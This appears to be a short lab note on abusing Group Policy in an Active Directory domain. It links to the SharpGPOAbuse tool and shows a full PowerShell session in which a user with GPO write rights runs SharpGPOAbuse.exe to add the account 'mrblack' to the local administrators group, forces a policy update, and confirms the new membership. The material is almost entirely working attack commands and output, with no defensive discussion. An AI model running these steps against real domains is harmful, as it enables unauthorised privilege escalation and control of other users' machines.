https://github.com/FSecureLABS/SharpGPOAbuse

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master

users has gpo write permissions

![image](https://user-images.githubusercontent.com/13157446/137199957-d1dd3c7e-3843-4ccb-8ed0-3564a935d698.png)


we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin group

	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net localgroup administrators
	Alias name     administrators
	Comment        Administrators have complete and unrestricted access to the computer/domain

	Members

	-------------------------------------------------------------------------------
	adm1n
	Administrator
	nightmare
	VALHALLA\Domain Admins
	win10
	The command completed successfully.

	PS C:\Users\testuser\Desktop\PowerSploit\Recon> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount mrblack --GPOName "vulngpo"
	[+] Domain = valhalla.local
	[+] Domain Controller = odin.valhalla.local
	[+] Distinguished Name = CN=Policies,CN=System,DC=valhalla,DC=local
	[+] SID Value of mrblack = S-1-5-21-3410397846-649609989-2919355437-2121
	[+] GUID of "vulngpo" is: {15DD3A52-32EB-4A98-ACAF-476C235E7968}
	[+] Creating file \\valhalla.local\SysVol\valhalla.local\Policies\{15DD3A52-32EB-4A98-ACAF-476C235E7968}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
	[+] versionNumber attribute changed successfully
	[+] The version number in GPT.ini was increased successfully.
	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
	[+] Done!
	PS C:\Users\testuser\Desktop\PowerSploit\Recon> gpupdate /force
	Updating policy...

	Computer Policy update has completed successfully.
	User Policy update has completed successfully.

	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net localgroup administrators
	Alias name     administrators
	Comment        Administrators have complete and unrestricted access to the computer/domain

	Members

	-------------------------------------------------------------------------------
	Administrator
	VALHALLA\mrblack
	The command completed successfully.

	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	adm1n                    Administrator            DefaultAccount
	Guest                    nightmare                WDAGUtilityAccount
	win10
	The command completed successfully.

	PS C:\Users\testuser\Desktop\PowerSploit\Recon>
